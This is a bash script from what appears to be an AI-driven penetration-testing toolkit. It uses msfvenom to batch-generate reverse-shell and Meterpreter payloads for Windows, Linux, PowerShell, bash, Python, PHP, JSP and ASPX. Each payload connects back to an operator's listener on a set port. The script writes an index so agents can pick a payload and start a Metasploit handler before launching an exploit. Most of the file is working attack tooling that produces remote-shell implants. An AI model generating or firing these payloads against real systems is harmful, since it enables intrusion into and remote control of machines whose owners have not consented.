#!/usr/bin/env bash
# PEN-AGENT preflight — pre-generate a standard payload set with msfvenom.
#
# Why: skipping the "pick payload + format + arch + LHOST/LPORT" decision
# loop mid-exploit saves tokens AND the compile/download time on the
# target side. Starter set only — no encoders, no custom templates. For
# hardened AV targets the teammate still runs msfvenom themselves with
# the right encoder.
#
# Usage:
#   bash tools/preflight/gen_payloads.sh --lhost 10.80.121.1
#                                        [--only-missing]
#                                        [--out engagement/payloads]
#
# --lhost accepts either an IPv4 or an interface name (tun0, eth0, …) —
# an interface name is resolved to its current IPv4 at build time so a
# VPN reconnect that changes the address doesn't invalidate the index
# (teammate just reruns this). The resolved IP is what's written into
# index.json's callback field.
#
# Output layout:
#   engagement/payloads/<name>.<ext>       — the binary
#   engagement/payloads/index.json         — matrix of {name, path, size,
#                                             payload, platform, arch,
#                                             format, lport, callback,
#                                             handler_module, sha256}
#
# Agents look it up with jq or the companion tools/preflight/pick.py:
#   python3 tools/preflight/pick.py --platform windows --arch x64 --format exe
#
# Rules of thumb for LPORT ranges (so one handler per payload class):
#   44xx = windows        45xx = linux       46xx = scripting
#   One LPORT per entry — teammate starts the matching handler via
#   mcp__metasploit-server__start_handler(payload=..., lhost=.., lport=..)
#   before firing the exploit.

set -euo pipefail

LHOST=""
OUT_DEFAULT="engagement/payloads"
OUT="$OUT_DEFAULT"
ONLY_MISSING=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --lhost) LHOST="$2"; shift 2;;
        --out)   OUT="$2";   shift 2;;
        --only-missing) ONLY_MISSING=1; shift;;
        -h|--help)
            sed -n '2,32p' "$0"; exit 0;;
        *) echo "ERROR: unknown flag $1" >&2; exit 2;;
    esac
done

if [[ -z "$LHOST" ]]; then
    echo "ERROR: --lhost required (IPv4 or interface name — tun0, eth0, …)" >&2
    exit 2
fi
if ! command -v msfvenom >/dev/null; then
    echo "ERROR: msfvenom not on PATH. Install metasploit or run in the"\
         "C2 container." >&2
    exit 2
fi

# If --lhost looks like an interface name (not an IPv4), resolve it to
# its current IPv4 so the index.json carries the real callback address
# the agents will tell targets to connect to.
if [[ ! "$LHOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    iface="$LHOST"
    resolved=""
    if command -v ip >/dev/null; then
        resolved=$(ip -o -4 addr show dev "$iface" 2>/dev/null \
                   | awk '{print $4}' | cut -d/ -f1 | head -1)
    fi
    if [[ -z "$resolved" ]] && command -v ifconfig >/dev/null; then
        resolved=$(ifconfig "$iface" 2>/dev/null \
                   | awk '/inet / {print $2}' | head -1)
    fi
    if [[ -z "$resolved" ]]; then
        echo "ERROR: interface '$iface' has no IPv4 (is the VPN up?)." >&2
        exit 2
    fi
    echo "[preflight] resolved iface $iface → $resolved"
    LHOST="$resolved"
fi

mkdir -p "$OUT"
INDEX="$OUT/index.json"

# Payload matrix: tab-separated columns
#   name  payload  format  arch  platform  lport  extra_opts  handler_module
# One LPORT per row (so each has a unique handler).
read -r -d '' MATRIX <<'EOF' || true
win-x64-meterpreter-staged	windows/x64/meterpreter/reverse_tcp	exe	x64	windows	4440		exploit/multi/handler
win-x64-meterpreter-stageless	windows/x64/meterpreter_reverse_tcp	exe	x64	windows	4441		exploit/multi/handler
win-x86-meterpreter-staged	windows/meterpreter/reverse_tcp	exe	x86	windows	4442		exploit/multi/handler
win-cmd-reverse	windows/shell_reverse_tcp	exe	x86	windows	4443		exploit/multi/handler
win-cmd-powershell-oneliner	cmd/windows/reverse_powershell	raw	x86	windows	4444		exploit/multi/handler
linux-x64-meterpreter-staged	linux/x64/meterpreter/reverse_tcp	elf	x64	linux	4450		exploit/multi/handler
linux-x64-meterpreter-stageless	linux/x64/meterpreter_reverse_tcp	elf	x64	linux	4451		exploit/multi/handler
linux-x64-shell-reverse	linux/x64/shell_reverse_tcp	elf	x64	linux	4452		exploit/multi/handler
linux-bash-oneliner	cmd/unix/reverse_bash	raw	x86	linux	4453		exploit/multi/handler
python-meterpreter	python/meterpreter_reverse_tcp	raw	x86	python	4460		exploit/multi/handler
php-meterpreter	php/meterpreter_reverse_tcp	raw	x86	php	4461		exploit/multi/handler
jsp-war-shell	java/jsp_shell_reverse_tcp	war	x86	java	4462		exploit/multi/handler
aspx-shell	windows/x64/shell_reverse_tcp	aspx	x64	windows	4463		exploit/multi/handler
EOF

# Format-to-extension override (format already carries the extension in
# most cases; raw needs a sensible suffix per platform).
_ext() {
    local fmt="$1" platform="$2"
    case "$fmt" in
        exe) echo "exe";;
        elf) echo "elf";;
        war) echo "war";;
        aspx) echo "aspx";;
        raw)
            case "$platform" in
                windows) echo "ps1";;
                linux)   echo "sh";;
                python)  echo "py";;
                php)     echo "php";;
                java)    echo "jsp";;
                *)       echo "bin";;
            esac
            ;;
        *) echo "bin";;
    esac
}

echo "[preflight] lhost=$LHOST   out=$OUT"
echo "[preflight] generating starter payload set …"
start_ts=$(date -u +%s)

# Build index.json incrementally (bash writes, python validates at end).
TMPIDX="$(mktemp)"
echo "[" > "$TMPIDX"
first=1

while IFS=$'\t' read -r name payload format arch platform lport extra_opts handler; do
    [[ -z "$name" || "$name" =~ ^# ]] && continue
    ext=$(_ext "$format" "$platform")
    outpath="$OUT/${name}.${ext}"
    skip=0
    if [[ $ONLY_MISSING -eq 1 && -s "$outpath" ]]; then
        skip=1
        echo "  skip (exists): $name"
    fi
    if [[ $skip -eq 0 ]]; then
        printf "  gen: %-32s → %s  (LPORT=%s)\n" "$name" "$outpath" "$lport"
        set +e
        extra_arr=()
        if [[ -n "$extra_opts" ]]; then
            # Split on spaces; operator can bake "-i 3 -b '\\x00'" etc.
            # shellcheck disable=SC2206
            extra_arr=($extra_opts)
        fi
        # Build the msfvenom args without eval so values with spaces survive.
        # The matrix doesn't currently carry spaces in extra_opts, but keep
        # it clean.
        msfvenom -p "$payload" "LHOST=$LHOST" "LPORT=$lport" \
                 -f "$format" "${extra_arr[@]}" -o "$outpath" \
                 >/dev/null 2>&1
        rc=$?
        set -e
        if [[ $rc -ne 0 || ! -s "$outpath" ]]; then
            echo "    WARN: msfvenom failed for $name (payload may not exist on"\
                 "this MSF build or format unsupported for this payload);"\
                 "entry omitted." >&2
            continue
        fi
        chmod 0644 "$outpath"
    fi

    size=$(stat -c '%s' "$outpath")
    sha=$(sha256sum "$outpath" | cut -d' ' -f1)
    # JSON escape
    name_j=$(printf '%s' "$name" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')
    path_j=$(printf '%s' "$outpath" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')
    payload_j=$(printf '%s' "$payload" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')
    handler_j=$(printf '%s' "$handler" | python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))')

    if [[ $first -eq 0 ]]; then echo "," >> "$TMPIDX"; fi
    first=0
    cat >> "$TMPIDX" <<JSON
  {
    "name": $name_j,
    "path": $path_j,
    "payload": $payload_j,
    "format": "$format",
    "arch": "$arch",
    "platform": "$platform",
    "lport": $lport,
    "callback": "$LHOST:$lport",
    "handler_module": $handler_j,
    "size": $size,
    "sha256": "$sha"
  }
JSON
done <<< "$MATRIX"

printf '\n]\n' >> "$TMPIDX"
mv "$TMPIDX" "$INDEX"

end_ts=$(date -u +%s)
cnt=$(python3 -c "import json; print(len(json.load(open('$INDEX'))))")
echo "[preflight] done. $cnt payload(s) in $INDEX  (elapsed $((end_ts-start_ts))s)"
